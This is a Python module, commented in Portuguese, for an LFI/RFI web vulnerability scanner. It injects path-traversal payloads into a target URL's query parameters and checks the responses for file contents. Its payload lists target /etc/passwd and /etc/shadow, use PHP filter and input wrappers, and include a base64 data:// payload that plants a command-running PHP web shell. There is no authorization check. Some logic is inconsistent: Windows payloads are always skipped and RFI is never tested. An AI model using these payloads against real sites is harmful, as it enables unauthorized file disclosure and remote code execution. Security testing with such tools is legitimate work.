"""
Scanner LFI/RFI — Vlad Volkov
Detecta vulnerabilidades de Local/Remote File Inclusion.
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Optional

from rich.console import Console
from rich.table import Table
from rich import box

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    pass

console = Console()

# Payloads LFI
PAYLOADS_LFI = {
    "linux_basico": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../etc/shadow",
        "../../../etc/hosts",
    ],
    "linux_encoding": [
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
    ],
    "linux_wrapper_php": [
        "php://filter/convert.base64-encode/resource=../../../etc/passwd",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    ],
    "windows": [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\windows\\win.ini",
        "C:\\boot.ini",
    ],
    "null_byte": [
        "../../../etc/passwd%00",
        "../../../etc/passwd\x00",
    ],
}

# Indicadores de LFI bem-sucedido
INDICADORES_LFI = [
    r"root:.*:0:0:",          # /etc/passwd Linux
    r"\[boot loader\]",       # boot.ini Windows
    r"\[fonts\]",             # win.ini Windows
    r"# localhost",           # /etc/hosts
    r"daemon:.*:/bin",        # /etc/passwd daemon entry
]

MARCADOR_PARAM = "VLADLFI9876"


class ScannerLFI:
    """Detecta vulnerabilidades de Local File Inclusion."""

    def __init__(self, timeout: int = 10, verificar_ssl: bool = False):
        self.timeout = timeout
        self.verificar_ssl = verificar_ssl
        self.sessao = requests.Session()
        self.sessao.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.vulnerabilidades = []

    def _requisicao(self, url: str) -> Optional[object]:
        try:
            return self.sessao.get(url, timeout=self.timeout, verify=self.verificar_ssl)
        except Exception:
            return None

    def _extrair_params(self, url: str) -> dict:
        parsed = urlparse(url)
        return parse_qs(parsed.query, keep_blank_values=True)

    def _url_com_param(self, url: str, param: str, valor: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [valor]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _detectar_lfi(self, resposta) -> Optional[str]:
        if resposta is None:
            return None
        corpo = resposta.text
        for indicador in INDICADORES_LFI:
            if re.search(indicador, corpo, re.IGNORECASE):
                return indicador
        return None

    def _param_inclui_arquivo(self, url: str, param: str) -> bool:
        """Verifica se o parâmetro parece incluir arquivos."""
        valor_original = urlparse(url).query
        keywords = ["file", "page", "include", "path", "load", "template",
                    "arquivo", "pagina", "dir", "document", "doc", "lang"]
        return any(kw in param.lower() for kw in keywords)

    def escanear(self, url: str, verboso: bool = True) -> List[dict]:
        """Executa scan LFI completo."""
        self.vulnerabilidades = []
        params = self._extrair_params(url)

        if not params:
            return []

        if verboso:
            console.print(f"  [cyan]→[/cyan] Testando LFI/RFI em: {url[:60]}")

        for param in params:
            for categoria, payloads in PAYLOADS_LFI.items():
                if "windows" in categoria:
                    # Testar Windows apenas se não Linux detectado
                    continue

                for payload in payloads[:2]:
                    url_teste = self._url_com_param(url, param, payload)
                    resp = self._requisicao(url_teste)
                    indicador = self._detectar_lfi(resp)

                    if indicador:
                        vuln = {
                            "tipo": "LFI",
                            "parametro": f"{param} (GET)",
                            "payload": payload,
                            "indicador": indicador,
                            "url": url_teste,
                            "severidade": "critico",
                        }
                        self.vulnerabilidades.append(vuln)
                        break

                if any(v["parametro"] == f"{param} (GET)" for v in self.vulnerabilidades):
                    break

                time.sleep(0.2)

        if verboso:
            if self.vulnerabilidades:
                console.print(
                    f"  [bold red]✓ LFI encontrado![/bold red] "
                    f"{len(self.vulnerabilidades)} vulnerabilidade(s)"
                )
            else:
                console.print("  [dim]✗ Nenhum LFI detectado[/dim]")

        return self.vulnerabilidades

    def exibir_resultado(self) -> None:
        if not self.vulnerabilidades:
            return

        tabela = Table(title="Vulnerabilidades LFI", box=box.ROUNDED, border_style="red")
        tabela.add_column("Parâmetro", style="cyan")
        tabela.add_column("Payload", style="yellow")
        tabela.add_column("Arquivo Lido", style="red")

        for v in self.vulnerabilidades:
            tabela.add_row(
                v["parametro"],
                v["payload"][:40],
                v.get("indicador", "?")[:30]
            )

        console.print(tabela)
